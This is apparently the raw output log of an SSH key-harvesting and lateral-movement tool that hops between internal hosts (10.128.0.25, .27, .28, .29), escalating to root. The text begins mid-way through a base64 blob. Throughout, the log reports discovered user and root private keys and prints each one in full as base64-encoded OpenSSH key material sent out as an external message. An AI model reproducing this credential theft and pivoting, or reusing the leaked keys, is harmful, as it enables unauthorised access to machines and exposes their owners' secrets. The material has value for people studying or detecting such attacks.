53dlVYcXN2aFpCaWxMUCs2cFFLKy9lMkVTdE80K255ZU91dFhBK01JMnRsRXVnYVZEU0x4UGpxWU9yZEpQaEJvCm5BNGlxbFltVDlTY2V6REp2VFhkaEJwZXltMmFtM0VXRTVPVjlRdElpNEZHOWEzU2lUdCs4K084TDl3enpUZjlyTVZjeGwKVGtZYzFjU0cwdEVId3RmOUFSZVBDZWVmK0dVcW92SldYMWMzZEpvWGl4aG9XRW1aUmVEZzlHOGF1WnlNd1RuZzNlR25LWAorV0w3cjRuNmtUTkVKTEdYS0hSdXgxa0tuRWx0MWN4bDNaSXROZ1RwTDd1YStMbXFHcThhby9SYzB4SHRjYXJId1VtczBPCmUxenU0YzRyK1RwemhuTmpqRzBZY0p3ek9mR21xcnc2dTdIVm5SSE9HbXVSNm5XcER3VnVCZVNtb1pmamViN1Vnb2pRbkIKSE9RSGNmQkk3d0NicmYyUVN4Nkxra2tyVVUyWXp5WGM2dGdEemhMWFZyNHVMaWxucHJnUjdwcXJSWTdvd1pmQ2Q4endlbApzWnFVVmdrTklSelArY2xZb1JMQjIwUG5sWEU4cTdVcHUrdnI2QUk2Tk5BZmJVNTNWZnkvZkovN0svSk9CK1dsanhnV3IxCjJEZ1ZVSTU4OUFCN2RkbUJveEl2aGM3YVkwMU9ielRvNTJ6RERRTkJkdXlPR2ZzZzFnQzFTZW9YbU4weDFuK3Fza1pFQWcKbVBodVEydFU2R1pWUDgzT1lJYnpyUE0yWFNrdXY3QmdJSmxvdSsyTHlaYjdLcWR0Mms1R3VLalhIOHVkUDVIN2VGUmdHUwpqN0lLVzJoL0xFUXYvOUovYmxhNTB5TXlaWnNvVVh4dlREbDhxMGdTN3AzeWZrRnpkUFZHTENSNmhlMUJQQitVSE1wUHlLClF4YnA3bzdhWGhlRm5CQy9URTdUYzgydytJNnlXZnRKUHVxazNQUFlrWEdHaTNLamE0UC9GdWxHZXpoVTUvb0pGajNVVFoKUDNBZzhHWmZ5cEpxZjFCSkhCbzBzUzBJcXN4U0srcjY3M01BTllBckpzZVVIc1IyTVhuNGlwdTQwaVJpWmFMcG5ZRHV1MwpmUzZsSEl2RVNVditjRG9oQm41MGNmalI4a3h6YlUxQ1Y2NUpmSHdUZk1jaGFHMDJ3R3p5cmJPbzNXN05kbkJSNDVtK3BVCi8yZWFYdXZkNk5Ma241SlFENmo0L2FvM1lEZ1RNaURrdlpZZU9WeEpxVjMyMjBWcUV2ZXFsMnpkSnFQSnFLTzVLU1pKSEgKaXFTcEVPSjFZa3VObExENXpaaXk1WEJ0eEJTWGU0RmRZYzlFNFlyTUhHbWNlMWcrallSelFqeWRVUUVlZjNybzF5ZzFzeQpZZ3puemlMMEtrUGtrL3pySGlEaWNhaHgwdU95NWlsaFhXQzYwcG9OZ0EyNzZqcldxNVB4MHhXTng2VFFNM2IvZHIzWGt3Ckh0S2poYW5sb2xiUWN3SGQ3VDUzRWdmZUUvU2NWbE9ZcEgyUmhlaGt6QTkwUnNiNVFFdjh6Q1AvQnhPWTludnlpK1V5cjEKa0d6QVdMOHVZdlpha3hJazkzTTlCU2tvL3VvVkpOUmlhNEhLZ2k3VnVuYWhRWU5vMStqL2Y1R1NUTWg0aVg1cDUzZGVWOApSNTRSL2kwZUN5WTd1VHJBRGJreVRtWnRIenJFbWxFeFEvaUpRdE1Ba2tFU3pFS3lRcG5hSXhzbnlTend6ZzFHbDBwMzZ1CkZmSk9mZm5kVXphZDJBWjR2K0lGVENMcFdrcEFPTDZJUTRPUWloNHRvaHIrT2laeWFLWWJKQnRJNmhld1JGbjgrUS9zQy8KdDVrQ09YdjJQUUdMNjNMUWFHVEUycVFPNi9VPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K\n[1704020283]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25: EXTERNAL_MSG: INFO: Beginning with 6 dests and 1 keys\n[1704020284]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27\n[1704020284]   jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)\n[1704020285]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27: Discovered usable private key [3072 MD5:5f:15:03:e3:c6:5e:7d:db:2d:b6:ea:a1:56:91:a8:ee jrogers@instance-5 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020285]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUEyLzVwbE1pVm4yaWVlaEVrUVFZSDBXTGo4anVpTTZiZmR3TDYzVEpucGdlU0dEcEZXYUxWCnJxdktSSjhZNEhRdTVJTXRHcFkvWG1XSVNOT2ZIOVpUcU1majZHdVRSK0dRcU01NzFSaTJ1RmJZY0t6SUhmK29PODNEWVUKeUVBdjZXSm1Xd3EwcndQcUxPUXpWRWRNQVVXRTVsNUpBalpSZFd5RXBaUkFqTlRubFZlbkc2QmVQZGgwZlZTRkxlMnVReApPSGdxOE9lRkdQL2gxS212REpocHo5YlZtc1ExM3dUSDN0ajh0RTVwK1RqRjFNMm52LzZhZlBLVlIrenBwZ1lUWkFnMVlLCmI3bDQ4UzhDYVpTMkZiRmJIL2FwRjZ3WHZYOENWbWlqTVJ6amQ1c0hvdi9tT29SM25WN0lIbVhBTWw5Sy9wWHRVY2FPQmwKYTJFZGpqblI3Z09CZFZBbXBvdEE0WG8yc3lnYnNHbVQzd29FOUJaSHVzSGZYL3VZemtmYlE5V1F1U1FDNnBkVXNwTG5IMApCM21pdS9sT0FIZ3ltZHg4VThXK1paQlpObW5PK3NFK0pTeGJwKzhET2YxT0w2ZXJLYUpuZGszVnZ6QlNhVmh0dTFwZnFrClYzUnoxUTFCS2ZqeWx6eDJodSs0VkRGUE1CRWpVTmk5bmI3eHE1T2pBQUFGa0t6aVd2MnM0bHI5QUFBQUIzTnphQzF5YzIKRUFBQUdCQU52K2FaVElsWjlvbm5vUkpFRUdCOUZpNC9JN29qT20zM2NDK3QweVo2WUhraGc2UlZtaTFhNnJ5a1NmR09CMApMdVNETFJxV1AxNWxpRWpUbngvV1U2akg0K2hyazBmaGtLak9lOVVZdHJoVzJIQ3N5QjMvcUR2TncyRk1oQUwrbGlabHNLCnRLOEQ2aXprTTFSSFRBRkZoT1plU1FJMlVYVnNoS1dVUUl6VTU1VlhweHVnWGozWWRIMVVoUzN0cmtNVGg0S3ZEbmhSai8KNGRTcHJ3eVlhYy9XMVpyRU5kOEV4OTdZL0xST2FmazR4ZFROcDcvK21uenlsVWZzNmFZR0UyUUlOV0NtKzVlUEV2QW1tVQp0aFd4V3gvMnFSZXNGNzEvQWxab296RWM0M2ViQjZMLzVqcUVkNTFleUI1bHdESmZTdjZWN1ZIR2pnWld0aEhZNDUwZTRECmdYVlFKcWFMUU9GNk5yTW9HN0Jwazk4S0JQUVdSN3JCMzEvN21NNUgyMFBWa0xra0F1cVhWTEtTNXg5QWQ1b3J2NVRnQjQKTXBuY2ZGUEZ2bVdRV1RacHp2ckJQaVVzVzZmdkF6bjlUaStucXltaVozWk4xYjh3VW1sWWJidGFYNnBGZDBjOVVOUVNuNAo4cGM4ZG9idnVGUXhUekFSSTFEWXZaMis4YXVUb3dBQUFBTUJBQUVBQUFHQkFOcEQyb0R4V2ZHa25NZERScEwwNXNESnVwCnJVcTZOUGh4ck83QktXTmR1Mld5NktjYy96RE1xV1NzSTJqem55UzZ3UXNhbFZORjMxb25lTzdxdHB1K3NURjMyN2JZNjkKcndhc2hwUHdSeWt4a09DSnJLcUd3bVZEU3Z1NExLbkQ2VGtEWDNzemlKUzhkcVNicnVXZXhSQ3dCOHZ6YmdxWVUxTzQ0RQpQdDc3UlNFWXJBVnU0TkcvZGlQNnZYL0o5MEU1bVJNQmwvdXNBSThBaE1xZzUzRVZSU00rK3ZpRHRTeFBMR21rSlNJalpRCks0ZHMyMmhUdFBjT3Z5bHpWb1dRTThuM2RsSmlKRVRhWmkrbU1JSi9NWUoxUXNuVEFKSjJBVFVseGJGQzVqOVlxTXNGT0YKRnA3cmYvOXZJeDJQYkhjaExxbWFFUDY0Zmx2VjhESmFaTmZ1cHVqNWxaR3RIYTk4dnRVK3JxSTQrWnVRUWlUNnI2WGluVApGZ2xYUXFQd2YzdjB6S2ZQTW5TUU53ekVKUG5QZmNCWWRsVU9ST3lEeXR2VG9Hb2hsNFRmMThJWlZpdFhHZTl6S3gvWGpSCkViNG9nb2RtNkVvb3lKbUNWUlFPSlg4NGlad0laNDc0WjhqTmxYYk5sdVZKQzNPV2VyNFJ1U0tmM1I5aTdZRWV3aFVRQUEKQU1FQXNUM2VpVmIvZk9HcGJ4VlJ4SEhGZGtMV2I3aWxmQTRGbnpSNkxFREhodGV2bVFlc3lLTkZJaUhmTEphQW1jN0ZqTwpKQUJkNUhUemFyWkpnUzB0TVNNY3M3bE14NGx6Q25oTVNiYnJBSDhSU0ZYVU8wK0hnUmsvMHJsV2ROMnN3OWpzL0NkN3RLClorTERLMTZKNE9DK1NDUUZpRWtTa2N2c1JabGNvWmFIcjdzNytzSWxidVpSNlZuL2MrNDloN3dmakhtRWZaMkxJV1gxYTQKL01ISlY2K3h2cnR1S1NhRld3cWJBdzBpSmZmZFR1NjFQTjI0aHhEYWdsM0JHR1Q3Ky9BQUFBd1FEdnAxUXBKTXVLSUUrRwpxMzRkRFhQQXRiYWNWQkFxTGJVSzRjTkx5cDV1ZGVGRm5hczdndWpzYkU0Zk5McXBEWExvNjQ1a2dwR3NuRG1IRGxaeGI3CmVwTlBZNEJZNmI0ZU05VGZxUTliNy9uUnJiWDk5Vm1YajJLQlBMMjluMFZ2SmhHWXowUnRJMklpS001T3h1WFFOVWFvcGcKRzNEVWZDOGVHSUhReWxOSGs0bC80Y0h2UUttbHY1aU1iREIrRVVhZUVUczd6ZnNONEc5ZTZFZnJOSlphait6TC92K0JJOApiNkJEdElZUm03cnYrMHpVOEJWZUdkQmd5MWZpQktxeWNBQUFEQkFPci96QUVTYlFEUXd5TGcrWTRnakRaaUVlejNVWE5kClpkNlZQa0NhUStJb2d1b0J5a0hIU2h1MXFuQ3diZFVkM3RsYWRkQ0xHN2VMYTYya2VIbHpBQ3A0TDlIVUlBS3ptSWVEa2EKT2lNTDdUV2pYMXpiaTNiMWJPR0xxWnM3eHNnWjd4bnNtQXBxTjhjeGtiaXU2S3hxbFc4U3FqcHBIS3VCZDh1ZXdhdzVDcAplUVltMWVsVlZKZTBMZEl3Y1VRSEJVWU1DSHdrY2NSSTQxRnFsbElNZ1BqNzYvWjYzelVWZ1VBL0pwRmp4S3pIdjV5Rzk1CndSZzFPWmlpZWoxV3JSSlFBQUFCSnFjbTluWlhKelFHbHVjM1JoYm1ObExUVUJBZ01FQlFZSAotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K\n[1704020285]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27: EXTERNAL_MSG: INFO: Beginning with 6 dests and 1 keys\n[1704020286]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29\n[1704020286]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020286]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28\n[1704020286]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)\n[1704020287]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28: Discovered usable private key [3072 MD5:b6:30:3a:99:e8:36:fe:81:33:0c:b2:82:6a:44:9a:55 jrogers@instance-6 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020287]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF3OU5sODBtQ04za1VuNVBRazhoY3hFY0xVQjJ1R0IvZVVHSTNxVnlPeEVwN3VKNC9uTlVxCjRmYmlDQlQ2SlExUFExRUtCM1JHNEtqSHpobnJreDcxR1J4YW45ZHBVN3QwRkZxbVVnajE1dVBqVy9Yd1hmMlJkUHFETVgKQm1STUdid3lnRUpibUpvblN2aGFBUjk5TTRONkZnTGJGb2hJYkJZcERRZkRublhpUDFxcHpVa1crMklaVTFaNFN4YWplNApXak1FREtCL0Z0b3gxbVVNQXlHUUx6WVovL1BORWtnY21ZakZYL0JVZUZqSkhHYzRTb0lsbThBVFpYcHYzZEVqNEt0VktGCkFEdHUySUlSbFlmcEJJeElmVjFybnJQSUtUdG1yME52NHlkSWhpTWFuVzNsalZ3c05oOFlwUGRGd1krWEN5QVdLd2ovaGkKbDVRTzlQQm93SmE1a0ttV0x5V2FYanc3Z3FacXVKbVNhWWVnYldsV0w3ejdrQ0ZNbUdkZlpwWkgrVXlXejhhZldjZlhkRQo3V1RPSUc3Qm9iTnZGczhPNVBmMllIRkhrZXhhNkVqS2pSOE9Jc0xJZGU0WnJmSVZGOVdYekdhUi9Xd0FFams3VWdhSGVuCmRmMllkWGFOWEQzT1hvL3AyQjk5M2Z1dFY1V0IzVkZuQWhLaGo0Zi9BQUFGaUJSbUJIa1VaZ1I1QUFBQUIzTnphQzF5YzIKRUFBQUdCQU1QVFpmTkpnamQ1RkorVDBKUElYTVJIQzFBZHJoZ2YzbEJpTjZsY2pzUktlN2llUDV6Vkt1SDI0Z2dVK2lVTgpUME5SQ2dkMFJ1Q294ODRaNjVNZTlSa2NXcC9YYVZPN2RCUmFwbElJOWViajQxdjE4RjM5a1hUNmd6Rndaa1RCbThNb0JDClc1aWFKMHI0V2dFZmZUT0RlaFlDMnhhSVNHd1dLUTBIdzU1MTRqOWFxYzFKRnZ0aUdWTldlRXNXbzN1Rm96QkF5Z2Z4YmEKTWRabERBTWhrQzgyR2YvenpSSklISm1JeFYvd1ZIaFl5UnhuT0VxQ0padkFFMlY2YjkzUkkrQ3JWU2hRQTdidGlDRVpXSAo2UVNNU0gxZGE1Nnp5Q2s3WnE5RGIrTW5TSVlqR3AxdDVZMWNMRFlmR0tUM1JjR1Bsd3NnRmlzSS80WXBlVUR2VHdhTUNXCnVaQ3BsaThsbWw0OE80S21hcmlaa21tSG9HMXBWaSs4KzVBaFRKaG5YMmFXUi9sTWxzL0duMW5IMTNSTzFremlCdXdhR3oKYnhiUER1VDM5bUJ4UjVIc1d1aEl5bzBmRGlMQ3lIWHVHYTN5RlJmVmw4eG1rZjFzQUJJNU8xSUdoM3AzWDltSFYyalZ3OQp6bDZQNmRnZmZkMzdyVmVWZ2QxUlp3SVNvWStIL3dBQUFBTUJBQUVBQUFHQUJyTDZyK0g1NUcvdDlxK1YyUmhucEFkU0tjCkY2TFRVWjQrSVlTV0R6T1YvYTc2dnFQVEZGc0VsRDNrYnBiODhPd1J6S25RcXJTaEE4Rlo3cFlqVVM2WE1BM3FyOTNYRnkKUFNnRXZKVzE0OW96OHZkczY2bzdDYWR3U1lhdzJQVk9vTlNEbjg3REdKMnBTNGI0Vm1RUmJrWEZCb3NsS2pONTlpZENHcAozWWZtMzRmNGV4OWUrK2FWT3phZ0V1R0pZalptS01adW91cnRkMEVRT1A3Nk44VFVFcWpva0dvUE42bHY0STBvbGtPbUcvCkw0dVFiMndZWVVXbTVEZldEOTZScmtlMG1BeklJczJkMmI4OWhuekdSVGxvaWZ2VlEwTUdxcy90NzB0NWQwUjFSZGpZL1QKalZLejFMQk5sUXU1REwwSy9zdHpGWkxySXM0NjhZVEs2R21HcWNzQ0F6eG1TMFp4amREYmx6b0dWejZIRURDQW9mWlBYcApqcUYwZXZOWS8yTDZjVzdpWEJPZFNyZ0R4dWdmWG5ZOVlPZXc1NXZ0L3U2a1h0V2tOUHh3VXc2OWljZHBBUzFZOUxUMVJZCjVhcWpONEd0UUNoQW1DeVNMejBxQWFUL2hsV01VdVlnMFVrZmFjTm9EU0xSWlVMSE5sQnRhSVNpWXUwSDZtVFdUaEFBQUEKd0QxR3kwU24xMGhNcjQvaFdxWjRoVFhNS2pUaTR2VmtsR1Z4QmxXdndhQjhhTE5pU25NRGgrZTI4N21VWXpkYStZeks1MAprL2JoakJOLzk2c25KTHN5SVQ1NVpiWDczYVJZdUR4ZHZyTXgzbEZJdGppMldScWFScGE1dWJ6V2VZYnFlU251YU5SMVpMCk5yZENOQkxjdGZ0UC9IZ3AveXQ0R1RpNW0ydGFhU0JnRFpsa3NDakN4ZTUyNVFQcGhGREp2eWRjQi9hWHZIVGhrdGQ0aFQKc1NGWDRUUm8xS2gxZDBCY3hrVGxzN3d4QUN2OVFMTHlyaEpyUDB1SWRsekl4cmhnQUFBTUVBOE42R2ZDUERuWnF6cUhYcwoyN082RmVKVEV6OWR2N0VOQlFYeHQ5US9UbHcvNnNXdTIwcmw4TXJhV1lwMXBmZ1RKdFVleU9DRnNkZTlpaDNhdktQRU1oCjJJTnkvbm51bEdjUHZJR0pUajlFSEYxYzJYdHBVNHVJbGQzVmIrUGZORzdvdUlSQUFpT1hjQ1FkYUQwNzQ4ZTd1SkJRNDQKVkhqNTBKUWRkV3d2WVU5QkxMMGNQSEVkMmFaTnJ4V0hkRFdYWW9QaThOd3dCZjRVNUt0WG45b0hsYzFXSjVKVWpzV21WWgpaajJob04yQzRNYnBOdGt1ZURWVURJTTN4Z3ZWK25BQUFBd1FEUUlJUzFtM0d6dW04bUVyZnhLRW54bUVyaUNaakg2eHlGClFHSzZZT1pHbS9qb1ZWVERscTh2RjQ3aW95NXVFc3RyYWxEZDF0bFYzWTFSaEYxYUFPaEdLK0RoUUpueFBMR1VnQ1h1UEUKNG1NSHcwS2Y2THc0Skh4OFIxZU9GZ0xxMkNVajlSbEMrOUl1ejc3c0lOUjMzanNWdUVSUC8zblFpYjA0bkt0MzgvL2hrSAp6dHNmZDQ2U1NLUjZmRmxQU3ppY0UzTGQvci94Mjhobno2S3FqdkdKRE5KdDM1bmE0STl4S3JVUkJFaDhIZzhsN0JPcXNqClJaTWhTUk41NDMzK2tBQUFBU2FuSnZaMlZ5YzBCcGJuTjBZVzVqWlMwMkFRPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020287]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28: Discovered usable private key [3072 MD5:fa:24:e5:39:6e:ca:01:bd:9d:ba:4f:dc:39:32:a1:8c root@instance-6 (RSA)] in [/root/.ssh/id_rsa]\n[1704020287]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28: EXTERNAL_MSG: KEY[/root/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF4dllUdE81WGEvUDN4S0ZPRTFTY3JhbmhFZHhZTzFIbUE1bnNpNVdIbHBOSURhWU5WZDIvCndOWEw1QXB4Sm5sYjFBUitObUtGa1RPN3ZyUmZaVkZ0UW1TejVEMkl0K3dUanc0SUpQdjBVdEVzUHd6VzNSTlhZRGFrZkgKRDd1T1RXZGt2VlMyVEtnL2w1TCttRDZjMjkxaUNQaVZPUVV0UENjWEJPQ1dBNURKelpIWEh5VVpvcUsvSlkvSS9KR0lINgpDMUhrQzVxaTFISERiVXlYbjd5dzMxU3QvL0Mra3VVdHYxM0lHTU5WUlNST09HYXp2VnZlTFlnK0k2c0d2dlFWRjNUKzBTCnJYaC9JZWg1Vkw0eVNvWUhOVTYvbHBNbFZiV1VoaXhLUURJaTFTdkNwMUlJNXJEd01ickszeWxyb3U3bEV5a2IrUjR0alIKcjVHd1NIMkJ1TVNtMzlEM1U5WVhTVEtNZW1tOERsQjhsazkxL0lXWXBwckxvMjlINkM2N3NweEFuRHRwbHZtWFh0YUU4dwpYSFpKaVBwTlRuL2JWQ25USXlmY3hLK0hwQURZQStQRUxZNzB1RE1aSWtLSmVPaGY0SzhPNkRSaGxvTmFCQmVId1JORzJ4Cmw4QkY2WWppNU5WUUpjS0dMZlpOYjVDUEpDZkVnS0hQd01Bb0ZNNmpBQUFGaUxyK2N0YTYvbkxXQUFBQUIzTnphQzF5YzIKRUFBQUdCQU1iMkU3VHVWMnZ6OThTaFRoTlVuSzJwNFJIY1dEdFI1Z09aN0l1Vmg1YVRTQTJtRFZYZHY4RFZ5K1FLY1NaNQpXOVFFZmpaaWhaRXp1NzYwWDJWUmJVSmtzK1E5aUxmc0U0OE9DQ1Q3OUZMUkxEOE0xdDBUVjJBMnBIeHcrN2prMW5aTDFVCnRreW9QNWVTL3BnK25OdmRZZ2o0bFRrRkxUd25Gd1RnbGdPUXljMlIxeDhsR2FLaXZ5V1B5UHlSaUIrZ3RSNUF1YW90UngKdzIxTWw1KzhzTjlVcmYvd3ZwTGxMYjlkeUJqRFZVVWtUamhtczcxYjNpMklQaU9yQnI3MEZSZDAvdEVxMTRmeUhvZVZTKwpNa3FHQnpWT3Y1YVRKVlcxbElZc1NrQXlJdFVyd3FkU0NPYXc4REc2eXQ4cGE2THU1Uk1wRy9rZUxZMGErUnNFaDlnYmpFCnB0L1E5MVBXRjBreWpIcHB2QTVRZkpaUGRmeUZtS2FheTZOdlIrZ3V1N0tjUUp3N2FaYjVsMTdXaFBNRngyU1lqNlRVNS8KMjFRcDB5TW4zTVN2aDZRQTJBUGp4QzJPOUxnekdTSkNpWGpvWCtDdkR1ZzBZWmFEV2dRWGg4RVRSdHNaZkFSZW1JNHVUVgpVQ1hDaGkzMlRXK1FqeVFueElDaHo4REFLQlRPb3dBQUFBTUJBQUVBQUFHQkFKbEdTYmhCUlNmdE14dFFDUTNyU1NpZ2pyCnRydkswMlVyVERoKytncW12ZDJzeG8rQzBHUUFzV3FaUnNWdThFM3pGZXBMelErWVQ3RGMvRXRSa2d1Y05FUVRHOEZlOWEKOTFabHdQQjlDYVFqY0tyQ0FXVWUyVmxOdnpuKzhHMW9IYS9VaStVaEtNS3pGaUZMREV5NksxMGlpSEdLNXN4b1JvdU5zUgpDWUNGc25HandNNUZqcEkwUG4xNVg2VHptS0tFOUFMeWFoWW4rM2hJNVhTeGZNRFpaL2JleVdVcnBudys2QkdQMjZ2WjRlCmNnUVJXcmF1WjJNOGFtS2dCdnBrbmQ0ZWZTc1lGLzRlZjlmU1dpVFl2eFNWSVROWEN0ZWUxc0JHZGpNMXEraGRCZ21QZHcKY2R5VlJUbExEL212a1RMYm5FRmEvVnJ2Z3lUQTZqUTlzSjJaSHM4Rjg1Y3o0c2pIZTExbzNwVm5MUXRqU3ZueWZNbzc2ZApFMmc2ZHdXRkVPRW1oRi8yOWFhdWl2MWdGZEU0S1lkVm1keTMvd2I5aWdFSmZyVENKZjdHMHNJYUx6SlM0TDZGQTRSNmdrCm1JOFBlWWhDUkZaN0ZxWUl1ODUzTEhyQ256TkhrdG5MeHJUY2RZKy9MenF1endYR3VQU0RKRy9lWHBlSCtlSjVjM2dRQUEKQU1FQTBJTnFFZEhBWGNxNGhEa25mSGVPcVFYb1ZrMmFsS1VJcHRHVlplNnphSW92dHBDU1IzZUltVy9Icm9YZDFJQVZ5Vgpqck52NzlIdWl0R013NmNxODJVY1M5NmRUU3hEVFQ1QXc2TXVvVzVaQUswLzFWenM2TlFJZ0dselZPNU9ib0RXZEVhV1FrCitTdXEvOHZpMEQzakV0RGF1Q1ZjUUh5dTVaTGtMRTQxTk5oY05PN0hndjc3a2Z3TnZpdkN3ZHpMNGFLeldCMDBNVWp0N28KUjY0UnFvVFhWUmxXUHFUOWFVZ2lwNzVmWXNMSVFFVmtFc1kySjUydkdwejd1ZmFMakRBQUFBd1FEMU9Cemt2NGhEQmdscwpXeHVwQWk5NTMxOU14bXgzWk9tbm1aMWxrKzFQNlIyU0orUEt0QlBXL0FNTjFTWk5XVjlaNWQxcXVHMXVYc3U4N0RvenB3CkZzU2hvdXY5eXo1VXkwWlJkUVRZYTlXYXRkT3lld0s1L3RuSzhKTDVjNklEUVA0SDQzR1U1cmxFMzlnYmwxK2U3LzBtT3MKWVJ6djcvZVhhakJUcS92MFVtRDZCczUvckRtK3cwUGpVWkJHTG1DRVBSVUFYTTdSUld2Rm53MWxzRjNnMDJoaXJQVlgxbApudkxKcVMxQW1xaFRyRHNNbmY3Snlqa0k0MzI0Y2xJV3NBQUFEQkFNKzFWMWs1MktzN2hHdzVBSWNjVThIdFg3d3poaFpICjh2bnhCUmJNYmNZMjFHS21jWlN6N0pzUGNuekFVVlZhbkZKK1VjUUl6OFNWbGRMdHU5dzQySUdxY2JJSDl1NG1NMnI0STkKQ0JNTlZKMk1mMUF1N2ZYbkRka2E4bWJDclBxZUY5T05tVGFlcVg4VllVVW9VTU1rbEdyRGp3bHdQajlGZ21NeGY5WG5kcQpHdEtCbFZFVlAxUmNsd25LUWlyMnNmV0pWQkNRL3NhWVJBcnVrWDUvY2dLWmNTNXBrSWRGc0wxU1gwWXZyd00rRTdUSGlPClkxSnI1U3NhWDcvMkg5cVFBQUFBOXliMjkwUUdsdWMzUmhibU5sTFRZQkFnPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020287]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28: EXTERNAL_MSG: INFO: Beginning with 6 dests and 2 keys\n[1704020288]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.25\n[1704020288]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.28)[!/root/.ssh/id_rsa]->root@(10.128.0.25)\n[1704020288]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.28[!/root/.ssh/id_rsa]->root@10.128.0.27\n[1704020288]     